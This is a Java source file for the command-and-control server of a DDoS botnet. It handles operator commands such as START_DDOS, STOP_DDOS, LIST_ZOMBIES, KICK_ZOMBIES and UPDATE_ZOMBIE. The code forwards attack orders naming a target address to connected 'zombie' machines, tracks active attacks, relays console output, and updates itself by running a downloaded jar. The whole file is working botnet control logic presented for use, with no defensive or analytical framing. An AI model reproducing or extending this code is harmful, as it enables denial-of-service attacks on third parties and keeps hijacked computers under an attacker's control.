package org.ddos.server.cycle;

import java.io.IOException;
import java.io.Serializable;
import java.net.SocketAddress;
import java.util.ArrayList;

import org.ddos.server.DDOSServer;
import org.ddos.updater.Updater;
import org.ddos.util.ActiveAttack;
import org.ddos.util.Computer;
import org.jnetwork.DataPackage;
import org.jnetwork.Server;
import org.jnetwork.SocketPackage;

public class ClientCycle {
	private boolean isForwardingConsoleOutput = false;
	private SocketPackage event;

	public void start(DDOSServer ddosServer, Server server, SocketPackage event)
			throws ClassNotFoundException, IOException {
		this.event = event;
		while (!event.getConnection().isClosed()) {
			DataPackage pkgIn = (DataPackage) event.getInputStream().readSpecificType(DataPackage.class);
			println("Package received: " + pkgIn.getMessage() + " (ID: " + pkgIn.getId() + ")");
			if (pkgIn.getMessage().equals("START_DDOS")) {
				ActiveAttack attack = new ActiveAttack();
				attack.setAttackingAddress((String) pkgIn.getObjects()[0]);
				attack.setOriginator(event.getConnection().getRemoteSocketAddress().toString());

				for (SocketPackage zombie : server.getClientsByData(true, null)) {
					attack.addZombieAddress(zombie.getConnection().getRemoteSocketAddress());
					zombie.getOutputStream().writeObject(pkgIn);
					server.setConnectionData(zombie, true, pkgIn.getObjects()[0]);
				}
				ddosServer.getStatus().addAttack(attack);
			} else if (pkgIn.getMessage().equals("DDOS_STATUS")) {
				event.getOutputStream().writeObject(new DataPackage(ddosServer.getStatus()).setMessage("DDOS_STATUS"));
			} else if (pkgIn.getMessage().equals("STOP_DDOS")) {
				ddosServer.getStatus()
						.removeAttack(ddosServer.getStatus().getAttackByAddress((String) pkgIn.getObjects()[0]));
				for (SocketPackage zombie : server.getClientsByData(true, pkgIn.getObjects()[0])) {
					zombie.getOutputStream().writeObject(pkgIn);
					server.setConnectionData(zombie, true, null);
				}
			} else if (pkgIn.getMessage().equals("KICK_ZOMBIES")) {
				for (SocketAddress zombie : (SocketAddress[]) pkgIn.getObjects()) {
					SocketPackage client = server.getClient(zombie);
					if (client.getExtraData()[1] != null) {
						ddosServer.getStatus().getAttackByAddress((String) client.getExtraData()[1])
								.removeZombieAddress(zombie);
					}
					server.removeClient(zombie);
				}
			} else if (pkgIn.getMessage().equals("LIST_ZOMBIES")) {
				ArrayList<Computer> computers = new ArrayList<>();
				for (SocketPackage pkg : server.getClients()) {
					if ((boolean) pkg.getExtraData()[0]) {
						computers.add(new Computer(pkg.getConnection().getRemoteSocketAddress(), true));
					}
				}

				event.getOutputStream().writeObject(
						new DataPackage(computers.toArray(new Computer[computers.size()])).setMessage("ALL_ZOMBIES"));
			} else if (pkgIn.getMessage().equals("KICK_ALL_ZOMBIES")) {
				for (SocketPackage zombie : server.getClients()) {
					if ((boolean) zombie.getExtraData()[0]) {
						if (zombie.getExtraData()[1] != null) {
							ddosServer.getStatus().getAttackByAddress((String) zombie.getExtraData()[1])
									.removeZombieAddress(zombie.getConnection().getRemoteSocketAddress());
						}

						server.removeClient(zombie);
					}
				}
			} else if (pkgIn.getMessage().equals("START_READ_SERVER")) {
				this.isForwardingConsoleOutput = true;
				ddosServer.readingClients.add(event);
			} else if (pkgIn.getMessage().equals("STOP_READ_SERVER")) {
				this.isForwardingConsoleOutput = false;
				ddosServer.readingClients.remove(event);
			} else if (pkgIn.getMessage().equals("START_READ_ZOMBIE")) {
				server.getClient((SocketAddress) pkgIn.getObjects()[0]).getOutputStream()
						.writeObject(new DataPackage(event.getConnection().getRemoteSocketAddress())
								.setMessage("START_READ_ZOMBIE"));
			} else if (pkgIn.getMessage().equals("STOP_READ_ZOMBIE")) {
				server.getClient((SocketAddress) pkgIn.getObjects()[0]).getOutputStream().writeObject(
						new DataPackage(event.getConnection().getRemoteSocketAddress()).setMessage("STOP_READ_ZOMBIE"));
			} else if (pkgIn.getMessage().equals("LIST_ALL")) {
				ArrayList<Computer> computers = new ArrayList<>();
				for (SocketPackage pkg : server.getClients()) {
					computers.add(new Computer(pkg.getConnection().getRemoteSocketAddress(),
							(boolean) pkg.getExtraData()[0]));
				}

				event.getOutputStream().writeObject(
						new DataPackage(computers.toArray(new Computer[computers.size()])).setMessage("ALL_COMPUTERS"));
			} else if (pkgIn.getMessage().equals("KILL_SERVER")) {
				for (SocketPackage zombie : server.getClients()) {
					if ((boolean) zombie.getExtraData()[0]) {
						if (zombie.getExtraData()[1] != null)
							zombie.getOutputStream().writeObject(
									new DataPackage((Serializable) zombie.getExtraData()[1]).setMessage("STOP_DDOS"));
						server.removeClient(zombie);
					}
				}

				System.out.println("Shutting down server by request.");
				System.exit(0);
			} else if (pkgIn.getMessage().equals("UPDATE_SERVER")) {
				Updater.downloadIfNonexistent();

				System.out.println("A client requested to update the server.");

				for (SocketPackage zombie : server.getClients()) {
					if ((boolean) zombie.getExtraData()[0]) {
						if (zombie.getExtraData()[1] != null)
							zombie.getOutputStream().writeObject(
									new DataPackage((Serializable) zombie.getExtraData()[1]).setMessage("STOP_DDOS"));
						server.removeClient(zombie);
					}
				}

				Runtime.getRuntime()
						.exec("java -jar " + System.getProperty("user.dir") + "\\" + Updater.NAME + " Server");
				System.exit(0);
			} else if (pkgIn.getMessage().equals("UPDATE_ZOMBIE")) {
				server.getClient((SocketAddress) pkgIn.getObjects()[0]).getOutputStream()
						.writeObject(new DataPackage().setMessage("UPDATE_ZOMBIE"));
			} else if (pkgIn.getMessage().equals("LIST_CLIENTS")) {
				ArrayList<Computer> computers = new ArrayList<>();
				for (SocketPackage pkg : server.getClients()) {
					if (!(boolean) pkg.getExtraData()[0]) {
						computers.add(new Computer(pkg.getConnection().getRemoteSocketAddress(), false));
					}
				}

				event.getOutputStream().writeObject(
						new DataPackage(computers.toArray(new Computer[computers.size()])).setMessage("ALL_CLIENTS"));
			}
			
			event.getOutputStream().reset();
		}

	}

	private void println(Object o) throws IOException {
		System.out.println(o);

		if (isForwardingConsoleOutput)
			event.getOutputStream().writeObject(new DataPackage(o.toString()).setMessage("SERVER_CONSOLE_OUTPUT"));
	}
}
